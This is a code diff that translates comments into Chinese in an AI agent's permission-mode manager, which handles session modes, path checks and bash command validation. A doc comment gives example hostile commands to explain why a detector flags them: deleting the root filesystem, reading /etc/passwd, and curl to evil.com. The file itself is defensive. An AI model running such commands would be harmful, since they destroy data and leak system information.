@@ -1,13 +1,13 @@
 /**
- * Centralized Permission Mode Manager
+ * 权限模式管理器（Permission Mode Manager）—— 集中维护每个 session 的权限模式状态。
  *
- * Manages agent permission modes for tool execution.
- * Each session has its own mode state - no global state contamination.
+ * Agent 在执行工具（tool use）之前，需要先判断“当前能不能做这件事”，这个判断由权限模式驱动。
+ * 每个 session 各自持有自己的 mode 状态，互不污染（无全局可变状态）。
  *
- * Available Permission Modes:
- * - 'safe': Read-only exploration mode (blocks writes, never prompts)
- * - 'ask': Ask for permission on dangerous operations (default interactive behavior)
- * - 'allow-all': Skip all permission checks (everything allowed)
+ * 可用权限模式（固定三种）：
+ * - 'safe'：只读探索模式，禁止任何写操作，绝不弹窗询问。
+ * - 'ask'：默认交互模式，遇到危险操作时弹窗询问用户。
+ * - 'allow-all'：跳过所有权限校验，全部放行。
  */
 
 /// <reference path="../types/incr-regex-package.d.ts" />
@@ -49,11 +49,12 @@ import {
   parsePermissionMode,
 } from './mode-types.ts';
 
-// Import incr-regex-package for smart pattern mismatch diagnostics
-// This library allows character-by-character matching to find WHERE a regex match failed
+// 引入 incr-regex-package：用于“增量正则匹配”，可以逐字符匹配，
+// 找出某条正则在命令串里的“哪一个位置匹配失败”，用于生成更精准的拒绝提示。
 import { IREGEX, DONE, MORE, FAILED } from 'incr-regex-package';
 
-// Re-export types and config from mode-types (single source of truth)
+// 把 mode-types 里定义的类型/常量从这里再导出一次，让外部引用统一从本模块入口，
+// mode-types 是真正的单一数据源（single source of truth）。
 export {
   type PermissionMode,
   type PermissionModeCanonical,
@@ -69,7 +70,7 @@ export {
   parsePermissionMode,
 };
 
-// Re-export PowerShell validator types
+// 把 PowerShell 校验器中的类型也一并重新导出
 export {
   type PowerShellValidationResult,
   type PowerShellValidationReason,
@@ -78,42 +79,46 @@ export {
 };
 
 /**
- * State for a single session's permission mode
+ * 触发模式变更的来源类型。
+ * 类比 Go：相当于一个枚举常量。
  */
 export type PermissionModeChangedBy = 'user' | 'system' | 'restore' | 'automation' | 'unknown';
 
+/**
+ * 单个 session 的权限模式状态快照。
+ */
 export interface ModeState {
-  /** Session ID */
+  /** Session 标识 */
   sessionId: string;
-  /** Current permission mode */
+  /** 当前权限模式 */
   permissionMode: PermissionMode;
-  /** Previous permission mode (if any mode transition has occurred) */
+  /** 若发生过模式切换，记录上一次的模式（用于展示“A → B”这类过渡信息） */
   previousPermissionMode?: PermissionMode;
-  /** Monotonic version incremented each time the mode changes */
+  /** 模式每次变更时单调递增的版本号（可用于检测变化、消费一次性信号） */
   modeVersion: number;
-  /** ISO timestamp for the last mode change */
+  /** 最近一次模式变更的 ISO 时间戳 */
   lastChangedAt: string;
-  /** Actor that initiated the last mode change */
+  /** 最近一次模式变更的发起方 */
   lastChangedBy: PermissionModeChangedBy;
-  /** Last user-mode modeVersion for which one-turn signal has been consumed */
+  /** 上一次被消费掉的“由用户发起”的 modeVersion（用于一次性信号机制） */
   lastUserSignalConsumedModeVersion?: number;
-  /** Callback when mode state changes */
+  /** 模式状态变化时的回调（可选） */
   onStateChange?: (state: ModeState) => void;
 }
 
 /**
- * Callbacks for mode changes
+ * 模式相关的回调集合。
  */
 export interface ModeCallbacks {
   onStateChange?: (state: ModeState) => void;
 }
 
 // ============================================================
-// Path Matching Utilities
+// 路径匹配工具函数
 // ============================================================
 
 /**
- * Expand ~ to home directory
+ * 把路径开头的 `~` 展开为用户家目录（类似 shell 的 `~` 行为）。
  */
 function expandHome(path: string): string {
   if (path.startsWith('~/') || path === '~') {
@@ -123,29 +128,29 @@ function expandHome(path: string): string {
 }
 
 /**
- * Convert a simple glob pattern to a regex
- * Supports: ** (recursive), * (single segment), ? (single char)
+ * 把简易 glob 模式转成正则。
+ * 支持：`**`（跨目录递归）、`*`（单个路径段，不跨 `/`）、`?`（单个字符）。
  */
 function globToRegex(pattern: string): RegExp {
-  // Expand ~ in pattern
+  // 先把模式里的 `~` 展开
   const expandedPattern = expandHome(pattern);
 
-  // Escape special regex chars except glob wildcards
+  // 转义正则特殊字符，但保留 glob 通配符语义
   let regex = expandedPattern
-    .replace(/[.+^${}()|[\]\\]/g, '\\$&')  // Escape regex special chars
-    .replace(/\*\*/g, '\0DOUBLE_STAR\0')   // Temporarily replace **
-    .replace(/\*/g, '[^/]*')                // * matches single path segment
-    .replace(/\0DOUBLE_STAR\0/g, '.*')      // ** matches anything including /
-    .replace(/\?/g, '.');                   // ? matches single char
+    .replace(/[.+^${}()|[\]\\]/g, '\\$&')  // 转义正则元字符
+    .replace(/\*\*/g, '\0DOUBLE_STAR\0')   // 先把 ** 临时占位
+    .replace(/\*/g, '[^/]*')                // * 只匹配单个路径段（不含 /）
+    .replace(/\0DOUBLE_STAR\0/g, '.*')      // ** 可匹配任意字符（含 /）
+    .replace(/\?/g, '.');                   // ? 匹配单个字符
 
   return new RegExp(`^${regex}$`);
 }
 
 /**
- * Check if a path matches any of the allowed write path patterns
+ * 判断给定路径是否命中“允许写入路径”列表中的任意一个 glob 模式。
  */
 function matchesAllowedWritePath(filePath: string, allowedPaths: string[]): boolean {
-  // Normalize path (expand ~, resolve, and use forward slashes)
+  // 归一化路径：展开 ~、转绝对路径、统一为正斜杠
   const normalizedPath = normalizeForComparison(expandHome(filePath));
 
   for (const pattern of allowedPaths) {
@@ -163,16 +168,19 @@ function matchesAllowedWritePath(filePath: string, allowedPaths: string[]): bool
 }
 
 /**
- * Normalize a path for cross-platform comparison.
- * - Resolve to absolute path
- * - Convert backslashes to forward slashes
- * - Lowercase on Windows for case-insensitive comparison
+ * 对路径做跨平台归一化，便于比较：
+ * - 转成绝对路径
+ * - 反斜杠统一成正斜杠
+ * - Windows 上再转小写，做大小写不敏感比较
  */
 function normalizeForComparison(path: string): string {
   const normalized = resolve(path).replace(/\\/g, '/');
   return process.platform === 'win32' ? normalized.toLowerCase() : normalized;
 }
 
+/**
+ * 判断 target 是否“在 base 内”或“等于 base”（基于归一化后的字符串比较）。
+ */
 function isWithin(base: string, target: string): boolean {
   const normalizedBase = normalizeForComparison(base);
   const normalizedTarget = normalizeForComparison(target);
@@ -181,10 +189,10 @@ function isWithin(base: string, target: string): boolean {
 }
 
 /**
- * Check whether targetPath is inside baseDir (or exactly equal to it).
+ * 判断 targetPath 是否位于 baseDir 内（或恰好等于 baseDir）。
  *
- * Uses path.relative semantics to avoid sibling-prefix bypasses and then
- * re-validates using real paths to prevent symlink escapes.
+ * 先用 path.relative 语义做检查，避免“兄弟目录前缀同名”绕过；
+ * 然后再用 real path（解析符号链接后的真实路径）复核，防止通过 symlink 逃逸出 baseDir。
  */
 function isPathWithinDirectory(targetPath: string, baseDir: string): boolean {
   const expandedTarget = expandHome(targetPath);
@@ -203,8 +211,9 @@ function isPathWithinDirectory(targetPath: string, baseDir: string): boolean {
     return isWithin(realBase, realTarget);
   }
 
-  // Target may be a new file path. Validate using nearest existing ancestor
-  // to prevent symlink escapes while still allowing legitimate new files.
+  // 目标路径可能还不存在（比如要新建的文件）。
+  // 沿父目录向上找到第一个真实存在的祖先目录，再用它做 real-path 校验，
+  // 既允许写新文件，又能防止通过尚未创建的 symlink 链逃逸。
   let current = dirname(resolvedTarget);
   while (true) {
     if (existsSync(current)) {
@@ -220,21 +229,22 @@ function isPathWithinDirectory(targetPath: string, baseDir: string): boolean {
 }
 
 // ============================================================
-// Mode Manager Class
+// 权限模式管理类（ModeManager）
 // ============================================================
 
 /**
- * Manager for per-session permission mode state.
- * Each session has its own state - NO GLOBAL STATE.
+ * 按 session 维护权限模式状态的管理器。
+ * 每个 session 拥有独立的状态——刻意避免任何全局可变状态。
  */
 class ModeManager {
+  // 三个 Map 都以 sessionId 为键，类比 Go 里的 `map[string]T`
   private states: Map<string, ModeState> = new Map();
   private callbacks: Map<string, ModeCallbacks> = new Map();
   private subscribers: Map<string, Set<() => void>> = new Map();
 
   /**
-   * Hydrate persisted transition context (previous mode) without mutating current mode/version.
-   * Used on session restore so transition metadata can survive app restarts.
+   * 在不修改当前模式/版本号的前提下，把“上一次的模式”补回到状态里。
+   * 主要用于 session 恢复（应用重启后重建过渡信息）。
    */
   setPreviousPermissionMode(sessionId: string, previousPermissionMode?: PermissionMode): void {
     const existing = this.getState(sessionId);
@@ -250,14 +260,14 @@ class ModeManager {
   }
 
   /**
-   * Get or create state for a session
+   * 获取或创建某 session 的状态（若不存在则用默认值初始化）。
    */
   getState(sessionId: string): ModeState {
     let state = this.states.get(sessionId);
     if (!state) {
       state = {
         sessionId,
-        permissionMode: 'ask', // Default to 'ask' until initialized
+        permissionMode: 'ask', // 在显式初始化前默认使用 'ask'
         modeVersion: 0,
         lastChangedAt: new Date().toISOString(),
         lastChangedBy: 'system',
@@ -268,8 +278,8 @@ class ModeManager {
   }
 
   /**
-   * Set permission mode for a session.
-   * @returns true when state changed, false when mode was unchanged
+   * 设置某 session 的权限模式。
+   * @returns 模式确实发生变化返回 true，未变化返回 false。
    */
   setPermissionMode(
     sessionId: string,
@@ -278,7 +288,7 @@ class ModeManager {
   ): boolean {
     const existing = this.getState(sessionId);
 
-    // No-op when mode is unchanged (prevents duplicate logs/events)
+    // 模式没变则直接返回，避免重复日志/事件
     if (existing.permissionMode === mode) {
       return false;
     }
@@ -286,6 +296,8 @@ class ModeManager {
     const changedAt = metadata?.changedAt ?? new Date().toISOString();
     const changedBy = metadata?.changedBy ?? 'unknown';
 
+    // 只有当不是“从 modeVersion=0 的恢复”场景时，才把当前模式记为 previous。
+    // 这样 restore 路径不会伪造一段“A→B”的过渡记录。
     const shouldTrackTransition = !(existing.modeVersion === 0 && changedBy === 'restore');
 
     const newState: ModeState = {
@@ -300,20 +312,20 @@ class ModeManager {
 
     debug(`[Mode] Set permission mode to ${mode} for session ${sessionId} (changedBy=${changedBy}, modeVersion=${newState.modeVersion})`);
 
-    // Notify callbacks (for CraftAgent internal sync)
+    // 通知注册的回调（CraftAgent 内部同步用）
     const callbacks = this.callbacks.get(sessionId);
     if (callbacks?.onStateChange) {
       callbacks.onStateChange(newState);
     }
 
-    // Notify React subscribers (for useSyncExternalStore)
+    // 通知 React 订阅者（配合 useSyncExternalStore 使用）
     this.subscribers.get(sessionId)?.forEach(cb => cb());
     return true;
   }
 
   /**
-   * Mark the current user-origin mode change signal as consumed.
-   * No-op unless the latest mode change was user-initiated.
+   * 标记“当前这次由用户触发的模式变更信号”已被消费。
+   * 仅当最近一次变更是用户发起时才生效；否则 no-op。
    */
   consumeUserModeSignal(sessionId: string): void {
     const existing = this.getState(sessionId);
@@ -333,21 +345,21 @@ class ModeManager {
   }
 
   /**
-   * Register callbacks for a session
+   * 为某 session 注册回调。
    */
   registerCallbacks(sessionId: string, callbacks: ModeCallbacks): void {
     this.callbacks.set(sessionId, callbacks);
   }
 
   /**
-   * Unregister callbacks for a session
+   * 注销某 session 的回调。
    */
   unregisterCallbacks(sessionId: string): void {
     this.callbacks.delete(sessionId);
   }
 
   /**
-   * Clean up a session's state
+   * 清理某 session 的全部状态（session 结束时调用，避免内存泄漏）。
    */
   cleanupSession(sessionId: string): void {
     this.states.delete(sessionId);
@@ -356,8 +368,8 @@ class ModeManager {
   }
 
   /**
-   * Subscribe to mode changes for a session (for React useSyncExternalStore)
-   * Returns an unsubscribe function
+   * 订阅某 session 的模式变化（给 React 的 useSyncExternalStore 用）。
+   * 返回一个“取消订阅”函数。
    */
   subscribe(sessionId: string, callback: () => void): () => void {
     if (!this.subscribers.has(sessionId)) {
@@ -365,30 +377,30 @@ class ModeManager {
     }
     this.subscribers.get(sessionId)!.add(callback);
 
-    // Return unsubscribe function
+    // 返回取消订阅函数
     return () => {
       this.subscribers.get(sessionId)?.delete(callback);
     };
   }
 }
 
-// Singleton manager instance
+// 单例管理器实例（全应用共享一个 ModeManager）
 export const modeManager = new ModeManager();
 
 // ============================================================
-// Permission Mode API
+// 权限模式对外 API（封装 modeManager 的薄包装）
 // ============================================================
 
 /**
- * Get the current permission mode for a session
+ * 获取某 session 当前的权限模式。
  */
 export function getPermissionMode(sessionId: string): PermissionMode {
   return modeManager.getState(sessionId).permissionMode;
 }
 
 /**
- * Set the permission mode for a session.
- * @returns true when state changed, false when mode was unchanged
+ * 设置某 session 的权限模式。
+ * @returns 模式确实发生变化返回 true，未变化返回 false。
  */
 export function setPermissionMode(
   sessionId: string,
@@ -399,28 +411,28 @@ export function setPermissionMode(
 }
 
 /**
- * Consume one-turn user mode-change signal for the current modeVersion.
+ * 消费“当前 modeVersion 上一次由用户触发的一次性信号”。
  */
 export function consumeUserModeSignal(sessionId: string): void {
   modeManager.consumeUserModeSignal(sessionId);
 }
 
 /**
- * Cycle to the next permission mode (for SHIFT+TAB)
- * @param sessionId - The session to cycle mode for
- * @param enabledModes - Optional list of enabled modes to cycle through (defaults to all 3)
- * Returns the new mode
+ * 循环切换到下一个权限模式（用于 SHIFT+TAB 快捷键）。
+ * @param sessionId - 要切换模式的 session
+ * @param enabledModes - 可选：允许循环的模式列表（不足 2 个时回退到全部三种模式）
+ * @returns 切换后的新模式
  */
 export function cyclePermissionMode(
   sessionId: string,
   enabledModes?: PermissionMode[]
 ): PermissionMode {
   const currentMode = getPermissionMode(sessionId);
-  // Use provided modes or default to all modes
+  // 启用模式列表有效就用它，否则回退到完整三种模式
   const modes = enabledModes && enabledModes.length >= 2 ? enabledModes : PERMISSION_MODE_ORDER;
   const currentIndex = modes.indexOf(currentMode);
 
-  // If current mode not in enabled list, jump to first enabled mode
+  // 当前模式不在启用列表里，直接跳到第一个启用模式
   if (currentIndex === -1) {
     const nextMode = modes[0] ?? 'ask';
     setPermissionMode(sessionId, nextMode, { changedBy: 'user' });
@@ -428,36 +440,36 @@ export function cyclePermissionMode(
   }
 
   const nextIndex = (currentIndex + 1) % modes.length;
-  // Safe assertion: nextIndex is always valid due to modulo operation
+  // 取模运算保证 nextIndex 一定在范围内，这里类型断言是安全的
   const nextMode = modes[nextIndex] as PermissionMode;
   setPermissionMode(sessionId, nextMode, { changedBy: 'user' });
   return nextMode;
 }
 
 /**
- * Subscribe to mode changes for a session (for React useSyncExternalStore)
- * Returns an unsubscribe function
+ * 订阅某 session 的模式变化（配合 React useSyncExternalStore）。
+ * 返回一个“取消订阅”函数。
  */
 export function subscribeModeChanges(sessionId: string, callback: () => void): () => void {
   return modeManager.subscribe(sessionId, callback);
 }
 
 /**
- * Get mode state for a session
+ * 获取某 session 的完整模式状态。
  */
 export function getModeState(sessionId: string): ModeState {
   return modeManager.getState(sessionId);
 }
 
 /**
- * Hydrate persisted transition context for a session without changing current mode.
+ * 把持久化保存的“上一次模式”补回某 session 的状态中，但不动当前模式。
  */
 export function hydratePreviousPermissionMode(sessionId: string, previousPermissionMode?: PermissionMode): void {
   modeManager.setPreviousPermissionMode(sessionId, previousPermissionMode);
 }
 
 /**
- * Lightweight diagnostics for permission denials and debugging.
+ * 轻量级诊断信息，用于权限拒绝场景和调试。
  */
 export function getPermissionModeDiagnostics(sessionId: string): {
   permissionMode: PermissionMode;
@@ -489,7 +501,7 @@ export function getPermissionModeDiagnostics(sessionId: string): {
 }
 
 /**
- * Initialize permission mode state for a session with callbacks
+ * 初始化某 session 的权限模式状态，并可选地注册回调。
  */
 export function initializeModeState(
   sessionId: string,
@@ -503,12 +515,11 @@ export function initializeModeState(
   } else if ('permissionMode' in initialMode && initialMode.permissionMode) {
     mode = initialMode.permissionMode;
   } else {
-    // Default to 'ask' if not specified
+    // 没有显式指定时默认 'ask'
     mode = 'ask';
   }
 
-  // IMPORTANT: Register callbacks BEFORE setting mode so the initial
-  // state change triggers the callback.
+  // 重要：必须先注册回调，再设置模式，这样初始状态变化才能触发回调。
   if (callbacks) {
     modeManager.registerCallbacks(sessionId, callbacks);
   }
@@ -516,38 +527,37 @@ export function initializeModeState(
 }
 
 /**
- * Clean up mode state for a session
+ * 清理某 session 的模式状态。
  */
 export function cleanupModeState(sessionId: string): void {
   modeManager.cleanupSession(sessionId);
 }
 
 // ============================================================
-// Tool Blocking Logic (Centralized)
+// 工具拦截逻辑（集中实现）
 // ============================================================
 
 /**
- * Config type that works with both ModeConfig and MergedPermissionsConfig
+ * 工具检查时使用的配置类型。
+ * 同时兼容 ModeConfig 和 MergedPermissionsConfig 两种结构。
  */
 type ToolCheckConfig = ModeConfig | MergedPermissionsConfig;
 
 /**
- * Dangerous control characters that could cause issues at lower levels.
+ * 危险控制字符集合。
  *
- * Note: Newlines and carriage returns are NOT blocked because bash-parser
- * correctly handles them as command separators, and the AST validation
- * checks each command individually. Only null bytes are blocked as they
- * could cause issues with C bindings and string handling.
+ * 注意：换行（\n）和回车（\r）不在黑名单里——bash-parser 已经把它们当作命令分隔符处理，
+ * AST 校验会逐条命令检查。这里只屏蔽 null 字节，因为它可能破坏 C 绑定层的字符串处理。
  */
 const DANGEROUS_CONTROL_CHARS = new Set([
-  '\x00',  // Null byte - can truncate strings in some contexts
+  '\x00',  // null 字节：某些上下文里会截断字符串
 ]);
 
 /**
- * Check if a command contains dangerous control characters.
+ * 判断命令中是否包含危险控制字符。
  *
- * @param command - The bash command to check
- * @returns true if command contains dangerous control chars, false if safe
+ * @param command - 待校验的 bash 命令
+ * @returns 含危险控制字符返回 true，否则 false
  */
 export function hasDangerousControlChars(command: string): boolean {
   for (const char of command) {
@@ -560,21 +570,21 @@ export function hasDangerousControlChars(command: string): boolean {
 }
 
 /**
- * Check if a command contains dangerous command/process substitution patterns.
+ * 判断命令中是否包含危险的“命令/进程替换”模式。
  *
- * Detects:
- * - Command substitution: $(...) or `...` (backticks)
- * - Process substitution: <(...) or >(...)
+ * 检测项：
+ * - 命令替换：`$(...)` 或反引号 `` `...` ``
+ * - 进程替换：`<(...)` 或 `>(...)`
  *
- * These are dangerous because they execute arbitrary commands:
- * - `ls $(rm -rf /)` - the rm runs during argument expansion
- * - `echo "$(cat /etc/passwd)"` - executes even inside double quotes
- * - `cat <(curl http://evil.com)` - process substitution runs curl
+ * 之所以危险，是因为这些结构会在“展开”阶段直接执行任意命令：
+ * - `ls $(rm -rf /)` —— rm 在参数展开时就会跑
+ * - `echo "$(cat /etc/passwd)"` —— 即使在双引号里也会执行
+ * - `cat <(curl http://evil.com)` —— 进程替换会真的去跑 curl
  *
- * Note: Single-quoted strings are safe: `echo '$(rm)'` is literal text
+ * 注意：单引号内的字符串是安全的字面量，例如 `echo '$(rm)'` 不会触发。
  *
- * @param command - The bash command to check
- * @returns true if command contains dangerous substitution, false if safe
+ * @param command - 待校验的 bash 命令
+ * @returns 含危险替换返回 true，否则 false
  */
 export function hasDangerousSubstitution(command: string): boolean {
   let inSingleQuote = false;
@@ -584,7 +594,7 @@ export function hasDangerousSubstitution(command: string): boolean {
     const char = command[i];
     const nextChar = command[i + 1];
 
-    // Handle escape sequences (only outside single quotes)
+    // 处理转义字符（仅在单引号外生效）
     if (escaped) {
       escaped = false;
       continue;
@@ -595,27 +605,27 @@ export function hasDangerousSubstitution(command: string): boolean {
       continue;
     }
 
-    // Track single quote state (double quotes don't protect against substitution)
+    // 单引号状态跟踪（双引号不能阻挡替换，所以只看单引号）
     if (char === "'" && !escaped) {
       inSingleQuote = !inSingleQuote;
       continue;
     }
 
-    // Only check for dangerous patterns outside single quotes
+    // 只在“非单引号”区域内检测危险模式
     if (!inSingleQuote) {
-      // Command substitution: $(
+      // 命令替换：$(
       if (char === '$' && nextChar === '(') {
         debug(`[Mode] Command substitution $() detected in: ${command}`);
         return true;
       }
 
-      // Backtick command substitution
+      // 反引号命令替换
       if (char === '`') {
         debug(`[Mode] Backtick substitution detected in: ${command}`);
         return true;
       }
 
-      // Process substitution: <( or >(
+      // 进程替换：<( 或 >(
       if ((char === '<' || char === '>') && nextChar === '(') {
         debug(`[Mode] Process substitution detected in: ${command}`);
         return true;
@@ -627,11 +637,11 @@ export function hasDangerousSubstitution(command: string): boolean {
 }
 
 // ============================================================
-// Bash Rejection Reasons (Detailed error messages)
+// Bash 拒绝原因（用于生成详细错误信息）
 // ============================================================
 
 /**
- * Pattern info for error messages - shows what patterns might have matched
+ * 错误信息里附带的“相关模式”信息：提示用户哪些白名单模式可能与该命令相关。
  */
 export interface RelevantPatternInfo {
   source: string;
@@ -639,8 +649,8 @@ export interface RelevantPatternInfo {
 }
 
 /**
- * Detailed reason why a bash command was rejected in Explore mode.
- * Used to provide helpful error messages that explain exactly what was blocked and why.
+ * Explore（safe）模式下拒绝某条 bash 命令时的详细原因。
+ * 用于产出可读的错误信息，明确告诉用户“被拦了什么、为什么被拦”。
  */
 export type BashRejectionReason =
   | { type: 'control_char'; char: string; charCode: number; explanation: string }
@@ -648,7 +658,7 @@ export type BashRejectionReason =
   | { type: 'dangerous_operator'; operator: string; operatorType: 'chain' | 'redirect'; explanation: string }
   | { type: 'dangerous_substitution'; pattern: string; explanation: string }
   | { type: 'parse_error'; error: string }
-  // New AST-based rejection types (from bash-validator)
+  // 来自 bash-validator 的 AST 校验新增的拒绝原因
   | { type: 'pipeline'; explanation: string }
   | { type: 'redirect'; op: string; explanation: string }
   | { type: 'command_expansion'; explanation: string }
@@ -659,7 +669,7 @@ export type BashRejectionReason =
   | { type: 'compound_partial_fail'; failedCommands: string[]; passedCommands: string[] };
 
 /**
- * Human-readable explanations for control characters.
+ * 控制字符的“人话”解释，便于在错误信息中说明危险性。
  */
 const CONTROL_CHAR_EXPLANATIONS: Record<string, string> = {
   '\n': 'newline acts as command separator in bash (e.g., `safe\\ndangerous` runs both)',
@@ -668,8 +678,7 @@ const CONTROL_CHAR_EXPLANATIONS: Record<string, string> = {
 };
 
 /**
- * Find the first dangerous control character in a command.
- * Returns details about the character if found, null otherwise.
+ * 在命令中找到第一个危险控制字符；没找到则返回 null。
  */
 function findDangerousControlChar(command: string): { char: string; charCode: number; explanation: string } | null {
   for (const char of command) {
@@ -684,8 +693,7 @@ function findDangerousControlChar(command: string): { char: string; charCode: nu
 }
 
 /**
- * Find dangerous command/process substitution in a command.
- * Returns details about the pattern if found, null otherwise.
+ * 在命令中查找危险的命令/进程替换；找到则返回其模式与解释，否则返回 null。
  */
 function findDangerousSubstitution(command: string): { pattern: string; explanation: string } | null {
   let inSingleQuote = false;
@@ -745,25 +753,22 @@ function findDangerousSubstitution(command: string): { pattern: string; explanat
 }
 
 /**
- * Find patterns that might be relevant to the attempted command.
- * Extracts the first word (command name) and finds patterns containing it.
- * This helps provide actionable error messages when a command is blocked.
+ * 找出与当前命令“可能相关”的白名单模式，用于在被拦截时给出更友好的提示。
+ * 实现方式：提取命令的第一个 token（命令名），筛选出包含该名字的模式。
  *
- * For example, if the command is "git -C /path status", this will find
- * the git pattern and show the agent what format is expected.
+ * 例如命令是 `git -C /path status`，就会找出形如 `^git\s+(status|log|...)` 的模式，
+ * 让 agent 知道白名单期望的格式长什么样。
  */
 function findRelevantPatterns(command: string, patterns: CompiledBashPattern[]): RelevantPatternInfo[] {
-  // Extract the first word (command name) from the command
+  // 取命令第一个 token 作为命令名
   const firstWord = command.trim().split(/\s+/)[0]?.toLowerCase();
   if (!firstWord) return [];
 
-  // Find patterns whose source contains the command name
-  // This catches patterns like "^git\s+(status|log|...)" when command starts with "git"
+  // 在模式源串里查找该命令名，这样能匹配 `^git\s+(status|log|...)` 这种模式
   const relevant: RelevantPatternInfo[] = [];
 
   for (const pattern of patterns) {
-    // Check if the pattern source contains the command name
-    // Use case-insensitive matching and look for the command at word boundaries
+    // 用大小写不敏感比较，并尽量在“词边界”附近匹配
     const sourceLower = pattern.source.toLowerCase();
     if (
       sourceLower.includes(firstWord) ||
@@ -776,13 +781,13 @@ function findRelevantPatterns(command: string, patterns: CompiledBashPattern[]):
     }
   }
 
-  // Limit to top 3 most relevant patterns to avoid overwhelming the agent
+  // 只取前 3 条，避免错误信息太长淹没 agent
   return relevant.slice(0, 3);
 }
 
 /**
- * Resolve command-specific hint for blocked bash commands.
- * Uses exact base-command match and optional whenNotMatching condition.
+ * 为被拦截的 bash 命令解析“命令专属提示”（hint）。
+ * 通过精确匹配基础命令名实现，可选附加 whenNotMatching 触发条件。
  */
 function findBlockedCommandHint(command: string, config: ToolCheckConfig): CompiledBlockedCommandHint | undefined {
   const hints = config.blockedCommandHints ?? [];
@@ -795,7 +800,7 @@ function findBlockedCommandHint(command: string, config: ToolCheckConfig): Compi
   for (const hint of hints) {
     if (hint.command !== baseCommand) continue;
 
-    // If a condition is provided, hint applies only when command does NOT match it
+    // 当配置了 whenNotMatching 条件时：只有当命令“不匹配”该条件，才使用本 hint
     if (hint.whenNotMatchingRegex && hint.whenNotMatchingRegex.test(command)) {
       continue;
     }
@@ -807,13 +812,12 @@ function findBlockedCommandHint(command: string, config: ToolCheckConfig): Compi
 }
 
 /**
- * Analyze WHY a command didn't match any pattern using incremental regex matching.
- * Uses incr-regex-package to find exactly WHERE in the command matching stopped,
- * which helps generate actionable error messages.
+ * 用“增量正则匹配”分析命令到底为什么没匹配上任何模式。
+ * 借助 incr-regex-package 逐字符匹配，定位命令里“匹配在哪里停止”，
+ * 从而给出可执行的错误提示。
  *
- * For example, if the command is "git -C /path status" and the pattern is
- * "^git\s+(status|log|diff)", this will detect that matching stopped at "-C"
- * and suggest running from within the repo directory instead.
+ * 例如命令 `git -C /path status` 与模式 `^git\s+(status|log|diff)` 匹配时，
+ * 能检测到停在 `-C`，并建议在仓库目录内运行命令。
  */
 function analyzePatternMismatch(command: string, patterns: CompiledBashPattern[]): MismatchAnalysis | null {
   const trimmedCommand = command.trim();
